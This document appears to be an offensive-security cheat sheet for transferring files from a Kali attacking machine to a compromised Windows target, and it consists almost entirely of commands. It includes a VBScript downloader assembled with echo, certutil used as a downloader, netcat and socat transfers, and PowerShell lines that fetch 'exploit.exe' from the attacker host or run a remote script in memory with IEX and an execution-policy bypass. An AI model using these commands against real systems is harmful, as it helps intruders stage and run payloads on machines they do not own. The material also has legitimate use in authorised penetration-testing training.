Kali Machine(Attacking machine)- We need to start the http server to serve the files so that other system can access it.

HTTP Server
```python
python -m SimpleHTTPServer 80
python -m http.server 80
```


TFTP
TFTP can be used to transfer files to/from older Windows OS.

By default installed on : Up to Windows XP and 2003.
By default not installed on : Windows 7, Windows 2008, and newer.

Kali
```bash
apt update && sudo apt install atftp
mkdir /tftp
chown nobody: /tftp
atftpd --daemon --port 69 /tftp
```
Windows
```powershell
tftp -i 192.168.1.2 PUT file1.txt
tftp -i 192.168.1.2 GET file2.txt
```


FTP
The below method can be used to transfer file from Linux to Windows. Similar technique can also be used to transfer file from WIndows to Linux but with a little trick.

Place your file(nc.exe in this case)ftphome directory on target linux
Replace the username/password in below with your FTP username/password.

Linux System(Attacking machine)
```bash
echo open 192.168.1.2 21> file.txt
echo USER username>> file.txt
echo password>> file.txt
echo bin >> file.txt
echo GET nc.exe >> file.txt
echo bye >> file.txt
```
Windows (Target machine)
```powershell
ftp -v -n -s:file.txt
```


Downloads/Transfer file on/to Windows system using scripting language.

VBScript(XP, 2003)

In this first we will echo all these commands in a file wget.vbs
If you are creating this file on windows then it will work fine.
If creating on Linux and then transferring to windows then you may face issue sometime, use unix2dos before you transfer it in this case.
```powershell
echo strUrl = WScript.Arguments.Item(0) > wget.vbs
echo StrFile = WScript.Arguments.Item(1) >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_DEFAULT = 0 >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_PRECONFIG = 0 >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_DIRECT = 1 >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_PROXY = 2 >> wget.vbs
echo Dim http,varByteArray,strData,strBuffer,lngCounter,fs,ts >> wget.vbs
echo Err.Clear >> wget.vbs
echo Set http = Nothing >> wget.vbs
echo Set http = CreateObject("WinHttp.WinHttpRequest.5.1") >> wget.vbs
echo If http Is Nothing Then Set http = CreateObject("WinHttp.WinHttpRequest") >> wget.vbs
echo If http Is Nothing Then Set http = CreateObject("MSXML2.ServerXMLHTTP") >> wget.vbs
echo If http Is Nothing Then Set http = CreateObject("Microsoft.XMLHTTP") >> wget.vbs
echo http.Open "GET",strURL,False >> wget.vbs
echo http.Send >> wget.vbs
echo varByteArray = http.ResponseBody >> wget.vbs
echo Set http = Nothing >> wget.vbs
echo Set fs = CreateObject("Scripting.FileSystemObject") >> wget.vbs
echo Set ts = fs.CreateTextFile(StrFile,True) >> wget.vbs
echo strData = "" >> wget.vbs
echo strBuffer = "" >> wget.vbs
echo For lngCounter = 0 to UBound(varByteArray) >> wget.vbs
echo ts.Write Chr(255 And Ascb(Midb(varByteArray,lngCounter + 1,1))) >> wget.vbs
echo Next >> wget.vbs
echo ts.Close >> wget.vbs
```
Using wget.vbs
```bash
cscript wget.vbs http://192.168.1.2/xyz.txt xyz.txt
```


Powershell(Win 7, 2008 and above)

A – If you have fully interactive Powershell session.

Download file
```powershell
powershell.exe (New-Object System.Net.WebClient).DownloadFile('http://192.168.1.2/exploit.exe', 'exploit.exe')
```
Download and execute without saving on disk
```powershell
powershell.exe IEX (New-Object System.Net.WebClient).DownloadString('http://192.168.1.2/test.ps1')
```
B – If there is no interactive Powershell session.

If we don’t have fully interactive shell to launch Powershell we need to create a powershell script and run as a file.
```powershell
echo $storageDir = $pwd > wget.ps1
echo $webclient = New-Object System.Net.WebClient >>wget.ps1
echo $url = "http://192.168.1.2/exploit.exe" >>wget.ps1
echo $file = "exploit1-ouput.exe" >>wget.ps1
echo $webclient.DownloadFile($url,$file) >>wget.ps1
```
Finally we can call and run the ps file using below
```powershell
powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -File wget.ps1
```


SMB
Kali
Use smbserver.py from Impacket.
```python
python smbserver.py ROPNOP /root/yogesh
```
Put any files within /root/yogesh folder (exploit.exe in this case)

Windows
```powershell
copy \192.168.1.2\ROPNOP\exploit.exe .
```


CertUtil
Start python http server on Attacker machine

Run below command on Windows(Target)
```bash
certutil.exe -urlcache -split -f "http://192.168.1.2/exploit.exe"
```




If anyhow you get Netcat, Socat, Wget, Curl on windows then below commands can be used for file transfer.

Netcat
Windows
```bash
nc -nlvp 4444 > outputfile.exe
```
Kali
```bash
nc -nv 192.168.1.2 4444 < /usr/inputfile.exe
```
Socat
Kali
```bash
socat TCP4-LISTEN:443,fork file:file.txt
```
Windows
```powershell
socat TCP4:192.168.1.2:443 file:file.txt,create
```
Wget
Kali
```python
python -m http.server 80 (On the same directory where file is available)
```
Windows
```powershell
wget http://192.168.1.2/exploit.exe
```
Curl
Kali
```python
python -m http.server 80 (On the same directory where file is available)
```
Windows
```powershell
curl http://192.168.1.2/exploit.exe -o exploit.exe
```
